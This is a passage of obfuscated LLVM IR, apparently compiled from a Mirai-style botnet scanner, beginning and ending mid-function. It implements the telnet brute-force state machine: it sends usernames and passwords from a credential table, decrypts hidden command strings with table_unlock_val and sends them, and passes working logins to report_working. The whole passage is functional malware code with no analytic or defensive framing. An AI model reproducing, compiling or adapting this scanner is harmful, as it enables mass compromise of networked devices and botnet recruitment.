  %665 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %664, i32 0, i32 1
  %666 = load i32, i32* %665, align 8
  %667 = srem i32 %666, 64
  %668 = zext i32 %667 to i64
  %669 = shl i64 1, %668
  %670 = xor i64 %663, -1
  %671 = xor i64 %669, -1
  %672 = xor i64 -1833703130112240719, -1
  %673 = or i64 %670, %671
  %674 = or i64 -1833703130112240719, %672
  %675 = xor i64 %673, -1
  %676 = and i64 %675, %674
  %677 = and i64 %663, %669
  %678 = icmp ne i64 %676, 0
  br i1 %678, label %679, label %710

; <label>:679:                                    ; preds = %655
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %680 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %681 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %680, i32 0, i32 1
  %682 = load i32, i32* %681, align 8
  %683 = bitcast i32* %29 to i8*
  %684 = call i32 @getsockopt(i32 %682, i32 1, i32 4, i8* %683, i32* %31) #6
  store i32 %684, i32* %30, align 4
  %685 = load i32, i32* %29, align 4
  %686 = icmp eq i32 %685, 0
  br i1 %686, label %687, label %698

; <label>:687:                                    ; preds = %679
  %688 = load i32, i32* %30, align 4
  %689 = icmp eq i32 %688, 0
  br i1 %689, label %690, label %698

; <label>:690:                                    ; preds = %687
  %691 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %692 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %691, i32 0, i32 3
  store i32 2, i32* %692, align 8
  %693 = call %struct.scanner_auth* @random_auth_entry()
  %694 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %695 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %694, i32 0, i32 0
  store %struct.scanner_auth* %693, %struct.scanner_auth** %695, align 8
  %696 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %697 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %696, i32 0, i32 6
  store i32 0, i32* %697, align 4
  br label %709

; <label>:698:                                    ; preds = %687, %679
  %699 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %700 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %699, i32 0, i32 1
  %701 = load i32, i32* %700, align 8
  %702 = call i32 @close(i32 %701)
  %703 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %704 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %703, i32 0, i32 1
  store i32 -1, i32* %704, align 8
  %705 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %706 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %705, i32 0, i32 8
  store i8 0, i8* %706, align 8
  %707 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %708 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %707, i32 0, i32 3
  store i32 0, i32* %708, align 8
  br label %1090

; <label>:709:                                    ; preds = %690
  br label %710

; <label>:710:                                    ; preds = %709, %655
  %711 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %712 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %713 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %712, i32 0, i32 1
  %714 = load i32, i32* %713, align 8
  %715 = sdiv i32 %714, 64
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds [16 x i64], [16 x i64]* %711, i64 0, i64 %716
  %718 = load i64, i64* %717, align 8
  %719 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %720 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %719, i32 0, i32 1
  %721 = load i32, i32* %720, align 8
  %722 = srem i32 %721, 64
  %723 = zext i32 %722 to i64
  %724 = shl i64 1, %723
  %725 = xor i64 %718, -1
  %726 = xor i64 %724, -1
  %727 = xor i64 1346419650110331604, -1
  %728 = or i64 %725, %726
  %729 = or i64 1346419650110331604, %727
  %730 = xor i64 %728, -1
  %731 = and i64 %730, %729
  %732 = and i64 %718, %724
  %733 = icmp ne i64 %731, 0
  br i1 %733, label %734, label %1089

; <label>:734:                                    ; preds = %710
  br label %735

; <label>:735:                                    ; preds = %1087, %734
  %736 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %737 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %736, i32 0, i32 3
  %738 = load i32, i32* %737, align 8
  %739 = icmp eq i32 %738, 0
  br i1 %739, label %740, label %741

; <label>:740:                                    ; preds = %735
  br label %1088

; <label>:741:                                    ; preds = %735
  %742 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %743 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %742, i32 0, i32 6
  %744 = load i32, i32* %743, align 4
  %745 = icmp eq i32 %744, 256
  br i1 %745, label %746, label %760

; <label>:746:                                    ; preds = %741
  %747 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %748 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %747, i32 0, i32 7
  %749 = getelementptr inbounds [256 x i8], [256 x i8]* %748, i32 0, i32 0
  %750 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %751 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %750, i32 0, i32 7
  %752 = getelementptr inbounds [256 x i8], [256 x i8]* %751, i32 0, i32 0
  %753 = getelementptr inbounds i8, i8* %752, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %749, i8* %753, i64 192, i32 1, i1 false)
  %754 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %755 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %754, i32 0, i32 6
  %756 = load i32, i32* %755, align 4
  %757 = sub i32 0, 64
  %758 = add i32 %756, %757
  %759 = sub nsw i32 %756, 64
  store i32 %758, i32* %755, align 4
  br label %760

; <label>:760:                                    ; preds = %746, %741
  %761 = call i32* @__errno_location() #7
  store i32 0, i32* %761, align 4
  %762 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %763 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %762, i32 0, i32 1
  %764 = load i32, i32* %763, align 8
  %765 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %766 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %765, i32 0, i32 7
  %767 = getelementptr inbounds [256 x i8], [256 x i8]* %766, i32 0, i32 0
  %768 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %769 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %768, i32 0, i32 6
  %770 = load i32, i32* %769, align 4
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds i8, i8* %767, i64 %771
  %773 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %774 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %773, i32 0, i32 6
  %775 = load i32, i32* %774, align 4
  %776 = sub i32 256, 1039384556
  %777 = sub i32 %776, %775
  %778 = add i32 %777, 1039384556
  %779 = sub nsw i32 256, %775
  %780 = call i32 @recv_strip_null(i32 %764, i8* %772, i32 %778, i32 16384)
  store i32 %780, i32* %32, align 4
  %781 = load i32, i32* %32, align 4
  %782 = icmp eq i32 %781, 0
  br i1 %782, label %783, label %785

; <label>:783:                                    ; preds = %760
  %784 = call i32* @__errno_location() #7
  store i32 104, i32* %784, align 4
  store i32 -1, i32* %32, align 4
  br label %785

; <label>:785:                                    ; preds = %783, %760
  %786 = load i32, i32* %32, align 4
  %787 = icmp eq i32 %786, -1
  br i1 %787, label %788, label %820

; <label>:788:                                    ; preds = %785
  %789 = call i32* @__errno_location() #7
  %790 = load i32, i32* %789, align 4
  %791 = icmp ne i32 %790, 11
  br i1 %791, label %792, label %819

; <label>:792:                                    ; preds = %788
  %793 = call i32* @__errno_location() #7
  %794 = load i32, i32* %793, align 4
  %795 = icmp ne i32 %794, 11
  br i1 %795, label %796, label %819

; <label>:796:                                    ; preds = %792
  %797 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %798 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %797, i32 0, i32 1
  %799 = load i32, i32* %798, align 8
  %800 = call i32 @close(i32 %799)
  %801 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %802 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %801, i32 0, i32 1
  store i32 -1, i32* %802, align 8
  %803 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %804 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %803, i32 0, i32 8
  %805 = load i8, i8* %804, align 8
  %806 = sub i8 0, 1
  %807 = sub i8 %805, %806
  %808 = add i8 %805, 1
  store i8 %807, i8* %804, align 8
  %809 = zext i8 %807 to i32
  %810 = icmp sge i32 %809, 10
  br i1 %810, label %811, label %816

; <label>:811:                                    ; preds = %796
  %812 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %813 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %812, i32 0, i32 8
  store i8 0, i8* %813, align 8
  %814 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %815 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %814, i32 0, i32 3
  store i32 0, i32* %815, align 8
  br label %818

; <label>:816:                                    ; preds = %796
  %817 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %817)
  br label %818

; <label>:818:                                    ; preds = %816, %811
  br label %819

; <label>:819:                                    ; preds = %818, %792, %788
  br label %1088

; <label>:820:                                    ; preds = %785
  %821 = load i32, i32* %32, align 4
  %822 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %823 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %822, i32 0, i32 6
  %824 = load i32, i32* %823, align 4
  %825 = sub i32 %824, -111897956
  %826 = add i32 %825, %821
  %827 = add i32 %826, -111897956
  %828 = add nsw i32 %824, %821
  store i32 %827, i32* %823, align 4
  %829 = load i32, i32* @fake_time, align 4
  %830 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %831 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %830, i32 0, i32 2
  store i32 %829, i32* %831, align 4
  br label %832

; <label>:832:                                    ; preds = %1086, %820
  store i32 0, i32* %33, align 4
  %833 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %834 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %833, i32 0, i32 3
  %835 = load i32, i32* %834, align 8
  switch i32 %835, label %1049 [
    i32 2, label %836
    i32 3, label %844
    i32 4, label %871
    i32 5, label %898
    i32 6, label %918
    i32 7, label %938
    i32 8, label %958
    i32 9, label %978
    i32 10, label %998
  ]

; <label>:836:                                    ; preds = %832
  %837 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %838 = call i32 @consume_iacs(%struct.scanner_connection* %837)
  store i32 %838, i32* %33, align 4
  %839 = icmp sgt i32 %838, 0
  br i1 %839, label %840, label %843

; <label>:840:                                    ; preds = %836
  %841 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %842 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %841, i32 0, i32 3
  store i32 3, i32* %842, align 8
  br label %843

; <label>:843:                                    ; preds = %840, %836
  br label %1050

; <label>:844:                                    ; preds = %832
  %845 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %846 = call i32 @consume_user_prompt(%struct.scanner_connection* %845)
  store i32 %846, i32* %33, align 4
  %847 = icmp sgt i32 %846, 0
  br i1 %847, label %848, label %870

; <label>:848:                                    ; preds = %844
  %849 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %850 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %849, i32 0, i32 1
  %851 = load i32, i32* %850, align 8
  %852 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %853 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %852, i32 0, i32 0
  %854 = load %struct.scanner_auth*, %struct.scanner_auth** %853, align 8
  %855 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %854, i32 0, i32 0
  %856 = load i8*, i8** %855, align 8
  %857 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %858 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %857, i32 0, i32 0
  %859 = load %struct.scanner_auth*, %struct.scanner_auth** %858, align 8
  %860 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %859, i32 0, i32 4
  %861 = load i8, i8* %860, align 4
  %862 = zext i8 %861 to i64
  %863 = call i64 @send(i32 %851, i8* %856, i64 %862, i32 16384)
  %864 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %865 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %864, i32 0, i32 1
  %866 = load i32, i32* %865, align 8
  %867 = call i64 @send(i32 %866, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  %868 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %869 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %868, i32 0, i32 3
  store i32 4, i32* %869, align 8
  br label %870

; <label>:870:                                    ; preds = %848, %844
  br label %1050

; <label>:871:                                    ; preds = %832
  %872 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %873 = call i32 @consume_pass_prompt(%struct.scanner_connection* %872)
  store i32 %873, i32* %33, align 4
  %874 = icmp sgt i32 %873, 0
  br i1 %874, label %875, label %897

; <label>:875:                                    ; preds = %871
  %876 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %877 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %876, i32 0, i32 1
  %878 = load i32, i32* %877, align 8
  %879 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %880 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %879, i32 0, i32 0
  %881 = load %struct.scanner_auth*, %struct.scanner_auth** %880, align 8
  %882 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %881, i32 0, i32 1
  %883 = load i8*, i8** %882, align 8
  %884 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %885 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %884, i32 0, i32 0
  %886 = load %struct.scanner_auth*, %struct.scanner_auth** %885, align 8
  %887 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %886, i32 0, i32 5
  %888 = load i8, i8* %887, align 1
  %889 = zext i8 %888 to i64
  %890 = call i64 @send(i32 %878, i8* %883, i64 %889, i32 16384)
  %891 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %892 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %891, i32 0, i32 1
  %893 = load i32, i32* %892, align 8
  %894 = call i64 @send(i32 %893, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  %895 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %896 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %895, i32 0, i32 3
  store i32 5, i32* %896, align 8
  br label %897

; <label>:897:                                    ; preds = %875, %871
  br label %1050

; <label>:898:                                    ; preds = %832
  %899 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %900 = call i32 @consume_any_prompt(%struct.scanner_connection* %899)
  store i32 %900, i32* %33, align 4
  %901 = icmp sgt i32 %900, 0
  br i1 %901, label %902, label %917

; <label>:902:                                    ; preds = %898
  call void @table_unlock_val(i8 zeroext 5)
  %903 = call i8* @table_retrieve_val(i32 5, i32* %35)
  store i8* %903, i8** %34, align 8
  %904 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %905 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %904, i32 0, i32 1
  %906 = load i32, i32* %905, align 8
  %907 = load i8*, i8** %34, align 8
  %908 = load i32, i32* %35, align 4
  %909 = sext i32 %908 to i64
  %910 = call i64 @send(i32 %906, i8* %907, i64 %909, i32 16384)
  %911 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %912 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %911, i32 0, i32 1
  %913 = load i32, i32* %912, align 8
  %914 = call i64 @send(i32 %913, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %915 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %916 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %915, i32 0, i32 3
  store i32 6, i32* %916, align 8
  br label %917

; <label>:917:                                    ; preds = %902, %898
  br label %1050

; <label>:918:                                    ; preds = %832
  %919 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %920 = call i32 @consume_any_prompt(%struct.scanner_connection* %919)
  store i32 %920, i32* %33, align 4
  %921 = icmp sgt i32 %920, 0
  br i1 %921, label %922, label %937

; <label>:922:                                    ; preds = %918
  call void @table_unlock_val(i8 zeroext 6)
  %923 = call i8* @table_retrieve_val(i32 6, i32* %37)
  store i8* %923, i8** %36, align 8
  %924 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %925 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %924, i32 0, i32 1
  %926 = load i32, i32* %925, align 8
  %927 = load i8*, i8** %36, align 8
  %928 = load i32, i32* %37, align 4
  %929 = sext i32 %928 to i64
  %930 = call i64 @send(i32 %926, i8* %927, i64 %929, i32 16384)
  %931 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %932 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %931, i32 0, i32 1
  %933 = load i32, i32* %932, align 8
  %934 = call i64 @send(i32 %933, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %935 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %936 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %935, i32 0, i32 3
  store i32 7, i32* %936, align 8
  br label %937

; <label>:937:                                    ; preds = %922, %918
  br label %1050

; <label>:938:                                    ; preds = %832
  %939 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %940 = call i32 @consume_any_prompt(%struct.scanner_connection* %939)
  store i32 %940, i32* %33, align 4
  %941 = icmp sgt i32 %940, 0
  br i1 %941, label %942, label %957

; <label>:942:                                    ; preds = %938
  call void @table_unlock_val(i8 zeroext 4)
  %943 = call i8* @table_retrieve_val(i32 4, i32* %39)
  store i8* %943, i8** %38, align 8
  %944 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %945 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %944, i32 0, i32 1
  %946 = load i32, i32* %945, align 8
  %947 = load i8*, i8** %38, align 8
  %948 = load i32, i32* %39, align 4
  %949 = sext i32 %948 to i64
  %950 = call i64 @send(i32 %946, i8* %947, i64 %949, i32 16384)
  %951 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %952 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %951, i32 0, i32 1
  %953 = load i32, i32* %952, align 8
  %954 = call i64 @send(i32 %953, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 4)
  %955 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %956 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %955, i32 0, i32 3
  store i32 8, i32* %956, align 8
  br label %957

; <label>:957:                                    ; preds = %942, %938
  br label %1050

; <label>:958:                                    ; preds = %832
  %959 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %960 = call i32 @consume_any_prompt(%struct.scanner_connection* %959)
  store i32 %960, i32* %33, align 4
  %961 = icmp sgt i32 %960, 0
  br i1 %961, label %962, label %977

; <label>:962:                                    ; preds = %958
  call void @table_unlock_val(i8 zeroext 7)
  %963 = call i8* @table_retrieve_val(i32 7, i32* %41)
  store i8* %963, i8** %40, align 8
  %964 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %965 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %964, i32 0, i32 1
  %966 = load i32, i32* %965, align 8
  %967 = load i8*, i8** %40, align 8
  %968 = load i32, i32* %41, align 4
  %969 = sext i32 %968 to i64
  %970 = call i64 @send(i32 %966, i8* %967, i64 %969, i32 16384)
  %971 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %972 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %971, i32 0, i32 1
  %973 = load i32, i32* %972, align 8
  %974 = call i64 @send(i32 %973, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %975 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %976 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %975, i32 0, i32 3
  store i32 9, i32* %976, align 8
  br label %977

; <label>:977:                                    ; preds = %962, %958
  br label %1050

; <label>:978:                                    ; preds = %832
  %979 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %980 = call i32 @consume_any_prompt(%struct.scanner_connection* %979)
  store i32 %980, i32* %33, align 4
  %981 = icmp sgt i32 %980, 0
  br i1 %981, label %982, label %997

; <label>:982:                                    ; preds = %978
  call void @table_unlock_val(i8 zeroext 8)
  %983 = call i8* @table_retrieve_val(i32 8, i32* %43)
  store i8* %983, i8** %42, align 8
  %984 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %985 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %984, i32 0, i32 1
  %986 = load i32, i32* %985, align 8
  %987 = load i8*, i8** %42, align 8
  %988 = load i32, i32* %43, align 4
  %989 = sext i32 %988 to i64
  %990 = call i64 @send(i32 %986, i8* %987, i64 %989, i32 16384)
  %991 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %992 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %991, i32 0, i32 1
  %993 = load i32, i32* %992, align 8
  %994 = call i64 @send(i32 %993, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %995 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %996 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %995, i32 0, i32 3
  store i32 10, i32* %996, align 8
  br label %997

; <label>:997:                                    ; preds = %982, %978
  br label %1050

; <label>:998:                                    ; preds = %832
  %999 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1000 = call i32 @consume_resp_prompt(%struct.scanner_connection* %999)
  store i32 %1000, i32* %33, align 4
  %1001 = load i32, i32* %33, align 4
  %1002 = icmp eq i32 %1001, -1
  br i1 %1002, label %1003, label %1026

; <label>:1003:                                   ; preds = %998
  %1004 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1005 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1004, i32 0, i32 1
  %1006 = load i32, i32* %1005, align 8
  %1007 = call i32 @close(i32 %1006)
  %1008 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1009 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1008, i32 0, i32 1
  store i32 -1, i32* %1009, align 8
  %1010 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1011 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1010, i32 0, i32 8
  %1012 = load i8, i8* %1011, align 8
  %1013 = sub i8 0, 1
  %1014 = sub i8 %1012, %1013
  %1015 = add i8 %1012, 1
  store i8 %1014, i8* %1011, align 8
  %1016 = zext i8 %1014 to i32
  %1017 = icmp eq i32 %1016, 10
  br i1 %1017, label %1018, label %1023

; <label>:1018:                                   ; preds = %1003
  %1019 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1020 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1019, i32 0, i32 8
  store i8 0, i8* %1020, align 8
  %1021 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1022 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1021, i32 0, i32 3
  store i32 0, i32* %1022, align 8
  br label %1025

; <label>:1023:                                   ; preds = %1003
  %1024 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1024)
  br label %1025

; <label>:1025:                                   ; preds = %1023, %1018
  br label %1048

; <label>:1026:                                   ; preds = %998
  %1027 = load i32, i32* %33, align 4
  %1028 = icmp sgt i32 %1027, 0
  br i1 %1028, label %1029, label %1047

; <label>:1029:                                   ; preds = %1026
  %1030 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1031 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1030, i32 0, i32 4
  %1032 = load i32, i32* %1031, align 4
  %1033 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1034 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1033, i32 0, i32 5
  %1035 = load i16, i16* %1034, align 8
  %1036 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1037 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1036, i32 0, i32 0
  %1038 = load %struct.scanner_auth*, %struct.scanner_auth** %1037, align 8
  call void @report_working(i32 %1032, i16 zeroext %1035, %struct.scanner_auth* %1038)
  %1039 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1040 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1039, i32 0, i32 1
  %1041 = load i32, i32* %1040, align 8
  %1042 = call i32 @close(i32 %1041)
  %1043 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1044 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1043, i32 0, i32 1
  store i32 -1, i32* %1044, align 8
  %1045 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1046 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1045, i32 0, i32 3
  store i32 0, i32* %1046, align 8
  br label %1047

; <label>:1047:                                   ; preds = %1029, %1026
  br label %1048

; <label>:1048:                                   ; preds = %1047, %1025
  br label %1050

; <label>:1049:                                   ; preds = %832
  store i32 0, i32* %33, align 4
  br label %1050

; <label>:1050:                                   ; preds = %1049, %1048, %997, %977, %957, %937, %917, %897, %870, %843
  %1051 = load i32, i32* %33, align 4
  %1052 = icmp eq i32 %1051, 0
  br i1 %1052, label %1053, label %1054

; <label>:1053:                                   ; preds = %1050
  br label %1087

; <label>:1054:                                   ; preds = %1050
  %1055 = load i32, i32* %33, align 4
  %1056 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1057 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1056, i32 0, i32 6
  %1058 = load i32, i32* %1057, align 4
  %1059 = icmp sgt i32 %1055, %1058
  br i1 %1059, label %1060, label %1064

; <label>:1060:                                   ; preds = %1054
  %1061 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1062 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1061, i32 0, i32 6
  %1063 = load i32, i32* %1062, align 4
  store i32 %1063, i32* %33, align 4
  br label %1064

; <label>:1064:                                   ; preds = %1060, %1054
  %1065 = load i32, i32* %33, align 4
  %1066 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1067 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1066, i32 0, i32 6
  %1068 = load i32, i32* %1067, align 4
  %1069 = sub i32 %1068, -157578729
  %1070 = sub i32 %1069, %1065
  %1071 = add i32 %1070, -157578729
  %1072 = sub nsw i32 %1068, %1065
  store i32 %1071, i32* %1067, align 4
  %1073 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1074 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1073, i32 0, i32 7
  %1075 = getelementptr inbounds [256 x i8], [256 x i8]* %1074, i32 0, i32 0
  %1076 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1077 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1076, i32 0, i32 7
  %1078 = getelementptr inbounds [256 x i8], [256 x i8]* %1077, i32 0, i32 0
  %1079 = load i32, i32* %33, align 4
  %1080 = sext i32 %1079 to i64
  %1081 = getelementptr inbounds i8, i8* %1078, i64 %1080
  %1082 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1083 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1082, i32 0, i32 6
  %1084 = load i32, i32* %1083, align 4
  %1085 = sext i32 %1084 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1075, i8* %1081, i64 %1085, i32 1, i1 false)
  br label %1086

; <label>:1086:                                   ; preds = %1064
  br label %832

; <label>:1087:                                   ; preds = %1053
  br label %735

; <label>:1088:                                   ; preds = %819, %740
  br label %1089

; <label>:1089:                                   ; preds = %1088, %710
